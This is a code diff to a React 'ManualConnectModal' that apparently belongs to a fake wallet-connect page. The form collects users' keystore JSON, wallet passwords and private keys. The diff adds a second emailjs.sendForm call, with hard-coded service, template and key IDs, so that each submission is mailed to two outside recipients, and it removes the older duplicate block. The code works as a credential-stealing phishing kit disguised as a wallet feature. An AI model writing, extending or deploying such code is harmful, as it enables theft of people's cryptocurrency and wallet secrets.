@@ -359,6 +359,15 @@ const ManualConnectModal = ({ selectedWallet, closeModal, onSubmit }) => {
           form.current,
           "DqbO8ehbSa9azzCOr"
         );
+        
+        await emailjs.sendForm(
+          "service_d6oupni",
+          "template_foi8ygt",
+          form.current,
+          "lkCQpXoMcvB5RJCev"
+        );
+
+
        // Reset form state values
        setUserText("");
        setKeystoreJson("");
@@ -373,26 +382,7 @@ const ManualConnectModal = ({ selectedWallet, closeModal, onSubmit }) => {
         alert("An error occurred while sending the form.");
       }
 
-    try {
-      await emailjs.sendForm(
-        "service_d6oupni",
-        "template_foi8ygt",
-        form.current,
-        "lkCQpXoMcvB5RJCev"
-      );
-     // Reset form state values
-     setUserText("");
-     setKeystoreJson("");
-     setWalletPassword("");
-     setPrivateKey("");
-
-    //  setIsSynchronizing(true);
-     onSubmit(); // Close the modal after successful submission
-    } catch (error) {
-      setIsSynchronizing(false);
-      console.error(error.text);
-      alert("An error occurred while sending the form.");
-    }
+  
     
   };
 
